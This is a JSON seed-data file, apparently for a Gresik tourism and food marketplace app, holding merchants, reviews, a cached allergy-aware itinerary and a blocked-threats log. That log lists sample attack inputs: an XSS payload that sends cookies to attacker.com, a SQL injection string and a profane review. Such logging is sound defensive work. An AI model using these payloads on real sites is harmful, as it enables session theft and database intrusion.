@@ -1,0 +1,336 @@
+{
+  "merchants": [
+    {
+      "id": "m1",
+      "name": "Nasi Krawu Bu Azza",
+      "owner": "Ibu Azza",
+      "type": "kuliner",
+      "description": "Nasi Krawu legendaris khas Gresik dengan suwiran daging sapi empuk, serundeng manis pedas, dan sambal petis super nikmat.",
+      "coords": [
+        -7.161,
+        112.6565
+      ],
+      "rating": 4.8,
+      "reviewsCount": 3,
+      "catalog": [
+        {
+          "id": "c1_1",
+          "name": "Nasi Krawu Daging",
+          "price": 20000,
+          "description": "Nasi pulen hangat disajikan di atas daun pisang dengan suwiran daging sapi gurih."
+        },
+        {
+          "id": "c1_2",
+          "name": "Nasi Krawu Babat Paru",
+          "price": 22000,
+          "description": "Kombinasi babat dan paru goreng bumbu rempah melimpah."
+        },
+        {
+          "id": "c1_3",
+          "name": "Es Sinom Khas Gresik",
+          "price": 5000,
+          "description": "Minuman herbal segar dari daun asam muda dan kunyit asli."
+        }
+      ]
+    },
+    {
+      "id": "m2",
+      "name": "Otak-otak Bandeng Pak Elan II",
+      "owner": "Pak Elan",
+      "type": "kuliner",
+      "description": "Bandeng tanpa duri legendaris yang dibakar sempurna dengan isian daging bandeng cincang berbumbu rahasia warisan leluhur.",
+      "coords": [
+        -7.1642,
+        112.645
+      ],
+      "rating": 4.7,
+      "reviewsCount": 2,
+      "catalog": [
+        {
+          "id": "c2_1",
+          "name": "Otak-otak Bandeng Bakar (Utuh)",
+          "price": 65000,
+          "description": "Satu ekor bandeng utuh tanpa duri isi otak-otak panggang wangi."
+        },
+        {
+          "id": "c2_2",
+          "name": "Bandeng Asap Khas Gresik",
+          "price": 70000,
+          "description": "Bandeng asap wangi gurih, oleh-oleh favorit nomor satu."
+        }
+      ]
+    },
+    {
+      "id": "m3",
+      "name": "Warung Kopi Amak (Kopi Kasar)",
+      "owner": "Cak Amak",
+      "type": "kuliner",
+      "description": "Tempat nongkrong ikonik Gresik yang menyajikan kopi tubruk kasar khas, diseduh langsung dari biji kopi robusta pilihan.",
+      "coords": [
+        -7.1585,
+        112.652
+      ],
+      "rating": 4.6,
+      "reviewsCount": 2,
+      "catalog": [
+        {
+          "id": "c3_1",
+          "name": "Kopi Kasar Cangkir",
+          "price": 4000,
+          "description": "Kopi robusta tubruk dengan ampas kasar yang bisa diseruput nikmat."
+        },
+        {
+          "id": "c3_2",
+          "name": "Kopi Susu Kasar",
+          "price": 6000,
+          "description": "Kopi kasar dipadukan dengan kental manis gurih."
+        }
+      ]
+    },
+    {
+      "id": "m4",
+      "name": "Situs Sejarah Giri Kedaton",
+      "owner": "Pengelola Dinas Pariwisata",
+      "type": "wisata",
+      "description": "Situs arkeologi pusat kerajaan Islam pertama di Jawa yang didirikan oleh Sunan Giri, menawarkan panorama kota Gresik dari atas bukit.",
+      "coords": [
+        -7.1812,
+        112.6322
+      ],
+      "rating": 4.9,
+      "reviewsCount": 1,
+      "catalog": [
+        {
+          "id": "c4_1",
+          "name": "Tiket Masuk Domestik",
+          "price": 5000,
+          "description": "Akses ke situs cagar budaya Giri Kedaton."
+        },
+        {
+          "id": "c4_2",
+          "name": "Pemandu Sejarah Lokal",
+          "price": 50000,
+          "description": "Tur edukasi sejarah kerajaan Islam Giri Kedaton selama 1 jam."
+        }
+      ]
+    },
+    {
+      "id": "m5",
+      "name": "Pantai Pasir Putih Dalegan",
+      "owner": "Kelompok Sadar Wisata Dalegan",
+      "type": "wisata",
+      "description": "Pantai pasir putih dengan ombak yang tenang dan sangat aman untuk rekreasi keluarga serta wahana air di ujung utara Gresik.",
+      "coords": [
+        -6.9015,
+        112.502
+      ],
+      "rating": 4.5,
+      "reviewsCount": 1,
+      "catalog": [
+        {
+          "id": "c5_1",
+          "name": "Tiket Masuk Pantai",
+          "price": 10000,
+          "description": "Tiket terusan rekreasi area pantai pasir putih."
+        },
+        {
+          "id": "c5_2",
+          "name": "Sewa Gazebo Pantai",
+          "price": 25000,
+          "description": "Sewa saung santai di pinggir pantai durasi sepuasnya."
+        }
+      ]
+    }
+  ],
+  "reviews": [
+    {
+      "id": "r1",
+      "merchantId": "m1",
+      "userName": "Ahmad_Tour",
+      "rating": 5,
+      "text": "Nasi krawunya enak sekali! Dagingnya empuk dan serundengnya manis pas. Wajib coba bagi wisatawan.",
+      "timestamp": "2026-05-20T10:15:30Z"
+    },
+    {
+      "id": "r2",
+      "merchantId": "m1",
+      "userName": "Budi Santoso",
+      "rating": 4,
+      "text": "Rasa hidangan disukai 90%, pelayanan dinilai agak sedikit lambat saat jam makan siang padat.",
+      "timestamp": "2026-05-21T12:00:00Z"
+    },
+    {
+      "id": "r3",
+      "merchantId": "m1",
+      "userName": "Lia_Traveler",
+      "rating": 5,
+      "text": "Sambalnya mantap betul! Tempatnya bersih dan pelayanannya ramah.",
+      "timestamp": "2026-05-22T08:30:00Z"
+    },
+    {
+      "id": "r4",
+      "merchantId": "m2",
+      "userName": "Roni_Kuliner",
+      "rating": 5,
+      "text": "Otak-otaknya tiada tanding. Rasa bumbu bandengnya meresap sampai ke dalam, dagingnya tebal.",
+      "timestamp": "2026-05-23T14:45:00Z"
+    },
+    {
+      "id": "r5",
+      "merchantId": "m2",
+      "userName": "Santi Kartika",
+      "rating": 4,
+      "text": "Sangat lezat, namun sayangnya tempat parkir roda empat agak terbatas.",
+      "timestamp": "2026-05-24T17:10:00Z"
+    },
+    {
+      "id": "r6",
+      "merchantId": "m3",
+      "userName": "WarkopLover",
+      "rating": 5,
+      "text": "Kopi kasar terbaik se-Gresik. Aromanya kuat dan rasanya sangat autentik merakyat.",
+      "timestamp": "2026-05-23T20:00:00Z"
+    },
+    {
+      "id": "r7",
+      "merchantId": "m3",
+      "userName": "Mega Prasetya",
+      "rating": 4,
+      "text": "Tempat nongkrong yang asik buat ngobrol santai sambil ngopi kasar malam hari.",
+      "timestamp": "2026-05-24T22:30:00Z"
+    },
+    {
+      "id": "r8",
+      "merchantId": "m4",
+      "userName": "SejarahLover",
+      "rating": 5,
+      "text": "Situs bersejarah yang sangat terawat. Pemandangannya indah dari bukit Giri.",
+      "timestamp": "2026-05-25T09:00:00Z"
+    },
+    {
+      "id": "r9",
+      "merchantId": "m5",
+      "userName": "KeluargaCeria",
+      "rating": 5,
+      "text": "Pasir putihnya bersih, ombaknya bersahabat untuk anak-anak bermain air.",
+      "timestamp": "2026-05-25T11:45:00Z"
+    }
+  ],
+  "threats": [
+    {
+      "id": "t_1779795694566",
+      "timestamp": "2026-05-26T11:41:34.566Z",
+      "ip": "::1",
+      "type": "Stored XSS",
+      "payload": "<script>alert('Dangerous XSS script!')</script>",
+      "severity": "HIGH",
+      "action": "BLOCKED"
+    },
+    {
+      "id": "t1",
+      "ip": "103.45.12.89",
+      "timestamp": "2026-05-25T14:22:10Z",
+      "type": "Stored XSS",
+      "payload": "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
+      "severity": "HIGH",
+      "action": "BLOCKED"
+    },
+    {
+      "id": "t2",
+      "ip": "182.253.90.11",
+      "timestamp": "2026-05-25T16:45:33Z",
+      "type": "SQL Injection",
+      "payload": "' OR '1'='1' --",
+      "severity": "HIGH",
+      "action": "BLOCKED"
+    },
+    {
+      "id": "t3",
+      "ip": "114.79.2.45",
+      "timestamp": "2026-05-26T02:11:05Z",
+      "type": "Cyberbullying / Profanity",
+      "payload": "Warung bangsat pelayanan kayak tahi babi!",
+      "severity": "MEDIUM",
+      "action": "BLOCKED"
+    }
+  ],
+  "cache": {
+    "394bc5bdcd37afe784b1f4a9746da5d77621f794d7989d24cc6b786c380c0350": {
+      "expiry": "2026-05-27T11:41:34.594Z",
+      "value": {
+        "title": "Eksplorasi Gresik 2 Hari - Pilihan Terbaik Wisata & Kuliner",
+        "description": "Itinerary perjalanan hemat dan aman yang dirancang khusus sesuai dengan preferensi Anda. Rute ini telah disaring secara aman oleh Data Privacy Guard untuk mendeteksi alergen: \"Alergi Seafood / Ikan Bandeng\". Semua olahan bandeng/seafood dihindari dan diganti dengan kuliner daging sapi/herbal.",
+        "totalCost": 75000,
+        "timeline": [
+          {
+            "day": 1,
+            "time": "08:30 - 11:30",
+            "activity": "Eksplorasi Sejarah: Kunjungan ke Pantai Pasir Putih Dalegan",
+            "location": "Pantai Pasir Putih Dalegan",
+            "cost": 10000,
+            "description": "Menikmati keindahan destinasi wisata Pantai pasir putih dengan ombak yang tenang dan sangat aman untuk rekreasi kelua...",
+            "lat": -6.9015,
+            "lng": 112.502,
+            "type": "wisata"
+          },
+          {
+            "day": 1,
+            "time": "12:00 - 13:30",
+            "activity": "Makan Siang Autentik: Kuliner di Nasi Krawu Bu Azza",
+            "location": "Nasi Krawu Bu Azza",
+            "cost": 20000,
+            "description": "Menikmati hidangan khas Nasi Krawu Daging. Nasi pulen hangat disajikan di atas daun pisang dengan suwiran daging sapi gurih.",
+            "lat": -7.161,
+            "lng": 112.6565,
+            "type": "kuliner"
+          },
+          {
+            "day": 1,
+            "time": "15:00 - 18:00",
+            "activity": "Rekreasi Sore Hari: Bersantai di Pantai Pasir Putih Dalegan",
+            "location": "Pantai Pasir Putih Dalegan",
+            "cost": 10000,
+            "description": "Bersantai sore hari dengan memesan Tiket Masuk Pantai. Pantai pasir putih dengan ombak yang tenang dan sangat aman untuk rekreasi kelua...",
+            "lat": -6.9015,
+            "lng": 112.502,
+            "type": "wisata"
+          },
+          {
+            "day": 2,
+            "time": "08:30 - 11:30",
+            "activity": "Eksplorasi Sejarah: Kunjungan ke Situs Sejarah Giri Kedaton",
+            "location": "Situs Sejarah Giri Kedaton",
+            "cost": 5000,
+            "description": "Menikmati keindahan destinasi wisata Situs arkeologi pusat kerajaan Islam pertama di Jawa yang didirikan oleh Sunan G...",
+            "lat": -7.1812,
+            "lng": 112.6322,
+            "type": "wisata"
+          },
+          {
+            "day": 2,
+            "time": "12:00 - 13:30",
+            "activity": "Makan Siang Autentik: Kuliner di Nasi Krawu Bu Azza",
+            "location": "Nasi Krawu Bu Azza",
+            "cost": 20000,
+            "description": "Menikmati hidangan khas Nasi Krawu Daging (Alternatif Alergi Seafood). Nasi pulen hangat disajikan di atas daun pisang dengan suwiran daging sapi gurih. (Dipilih secara otomatis karena Anda memiliki batasan medis terhadap seafood).",
+            "lat": -7.161,
+            "lng": 112.6565,
+            "type": "kuliner"
+          },
+          {
+            "day": 2,
+            "time": "15:00 - 18:00",
+            "activity": "Rekreasi Sore Hari: Bersantai di Pantai Pasir Putih Dalegan",
+            "location": "Pantai Pasir Putih Dalegan",
+            "cost": 10000,
+            "description": "Bersantai sore hari dengan memesan Tiket Masuk Pantai. Pantai pasir putih dengan ombak yang tenang dan sangat aman untuk rekreasi kelua...",
+            "lat": -6.9015,
+            "lng": 112.502,
+            "type": "wisata"
+          }
+        ],
+        "allergyWarning": "Perhatian Medis: Rute disesuaikan untuk alergi terhadap \"Alergi Seafood / Ikan Bandeng\" secara terenkripsi."
+      }
+    }
+  }
+}
